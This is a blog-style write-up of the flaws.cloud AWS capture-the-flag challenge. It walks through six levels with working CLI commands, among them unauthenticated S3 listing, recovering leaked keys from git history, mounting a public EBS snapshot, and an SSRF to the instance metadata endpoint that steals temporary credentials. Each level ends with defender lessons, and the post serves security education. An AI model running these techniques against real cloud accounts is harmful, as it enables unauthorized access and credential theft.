---
layout: post
title: "Flaws.Cloud CTF Writeup"
date: 2022-05-25 16:12:13 +0000
categories: Cybersecurity
tags: [aws,cloud]
author: admin
---

What does a misconfigured S3 bucket, a leaked AWS key buried in git history, and an unprotected EC2 snapshot all have in common? They're all real-world cloud security mistakes and they're all exploitable in [flaws.cloud](http://flaws.cloud), a free AWS security challenge built by Scott Piper. In this writeup, I walk through all 6 levels, covering the vulnerabilities, the commands used to exploit them, and the key lessons for defenders. Big thank you to Day for introducing me to this challenge!

## Level 1 — Public S3 Bucket Listing

> *This level is buckets of fun. See if you can find the first sub-domain.*

The first thing I did was run `nslookup` on the domain to get the IP address, then entered that IP into the browser — which redirected me to the Amazon S3 page. Running `nslookup` again with the IP revealed both the sub-domain and the AWS region the bucket was hosted in.

Once I had the sub-domain, I checked whether the bucket had loose permissions by listing its contents without authentication:

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-east-2
```

A `robots.txt` file caught my eye. I copied it to my local drive:

```bash
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html ./Downloads
```

That file contained the link to Level 2.

### Key Takeaway

Always audit S3 bucket permissions. While `s3:GetObject` is needed for a public static website, enabling `s3:ListBucket` for everyone exposes all object names — which can lead to sensitive file discovery.

---

## Level 2 — AWS Account–Scoped S3 Permissions

> *The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this.*

This bucket wasn't publicly accessible, but it was open to **any authenticated AWS account** — not just the bucket owner's. Using my own free-tier AWS profile:

```bash
aws s3 --profile <your-profile> ls s3://<level-2-bucket-name>
```

I listed the files, copied the secret file, and moved on to Level 3.

### Key Takeaway

Restricting public access isn't enough if the bucket policy allows access to any AWS account. Lock down bucket policies to specific account IDs or IAM principals — not the entire AWS platform.

---

## Level 3 — Leaked Credentials in Git History

> *Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.*

Listing the Level 3 bucket revealed a `.git` directory inside. I synced the entire bucket locally to examine the history:

```bash
aws s3 sync s3://<level-3-bucket-name> . --no-sign-request --region us-east-2
git log
git diff <commit-hash>
```

The diff showed that the owner had **hard-coded AWS access keys** in a file and later deleted them — but the credentials were still visible in git history.

I configured a new profile with those leaked credentials and listed all S3 buckets to find the next level:

```bash
aws configure --profile flaws
aws --profile flaws s3 ls
```

### Key Takeaway

Deleting a committed secret does not remove it from git history. If credentials are ever exposed in a commit, **immediately revoke and rotate them** — even if you deleted the commit right away.

---

## Level 4 — Unprotected EC2 Snapshot

> *Get access to the web page running on the EC2 at `4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`. A snapshot was made of that EC2 shortly after nginx was set up on it.*

### Step 1: Identify the Snapshot

First, I confirmed the owner's account ID:

```bash
aws sts get-caller-identity
```

With the account ID (`975426262029`), I listed all snapshots owned by that account:

```bash
aws ec2 describe-snapshots --owner-id 975426262029
```

### Step 2: Mount the Snapshot on My Own EC2

I created an EBS volume from the snapshot in my free-tier account — **must be in `us-west-2`**, the region where the snapshot was created. Then I launched a new EC2 instance and attached that volume to it as a second disk.

### Step 3: SSH In and Read the Files

Once inside the EC2 via Putty (Windows), I listed block devices and mounted the volume:

```bash
lsblk
sudo mount /dev/xvde1 /mnt
```

Navigating to `/mnt/home/ubuntu/` and reading `setupNginx.sh` revealed the nginx credentials needed for Level 5.

### Key Takeaway

EBS snapshots are often left with overly broad sharing permissions. Always **restrict snapshot access** and **encrypt sensitive volumes** so that even if a snapshot is shared accidentally, its data remains protected.

---

## Level 5 — IMDS Credential Exposure via SSRF

> *This EC2 has a simple HTTP-only proxy. Use it to list the contents of the level6 bucket.*

This level exploited the **EC2 Instance Metadata Service (IMDS)** through a misconfigured HTTP proxy. By routing requests through the proxy to `169.254.169.254`, I could reach the internal metadata endpoint:

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
```

This returned the name of the attached IAM role. Drilling deeper:

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Exposed a full set of temporary credentials — Access Key, Secret Key, and Session Token. I configured a profile with those credentials and listed the Level 6 bucket:

```bash
aws --profile level5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

### Key Takeaway

The IMDS endpoint exposes temporary credentials to anyone who can make requests to `169.254.169.254`. Protect against SSRF-based credential theft by:
- **Enforcing IMDSv2** (requires session-based tokens, blocking simple SSRF)
- **Blocking outbound requests** to `169.254.169.254` at the application or network level

---

## Level 6 — IAM Policy Enumeration via Lambda

> *You're given a user access key with the SecurityAudit policy. See what else it can do.*

After configuring a profile with the provided credentials, I identified the user and listed their attached policies:

```bash
aws iam get-user --profile level6
aws iam list-attached-user-policies --user-name Level6 --profile level6
```

One policy was custom-created for the challenge. I fetched its version to read the policy document:

```bash
aws iam list-policy-versions --policy-arn <arn> --profile level6
aws iam get-policy-version --policy-arn <arn> --version-id <version> --profile level6
```

The policy granted `lambda:GetPolicy` and `lambda:InvokeFunction`. I enumerated Lambda functions in the account:

```bash
aws lambda list-functions --profile level6
```

Found a function named `Level6`. To invoke it via API Gateway, I needed the REST API ID and stage:

```bash
aws lambda get-policy --function-name Level6 --profile level6
aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6
```

The stage was `Prod`. Navigating to `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6` in the browser completed the challenge.

### Key Takeaway

Read access on IAM policies — such as `iam:GetPolicyVersion` — allows attackers to map the entire permission structure of an account. Combined with Lambda enumeration, it can reveal execution paths to escalate access. Always apply the **principle of least privilege** and audit who can read your IAM policies.

Thank you for reading! Feel free to reach out via Linkedin if you have any questions.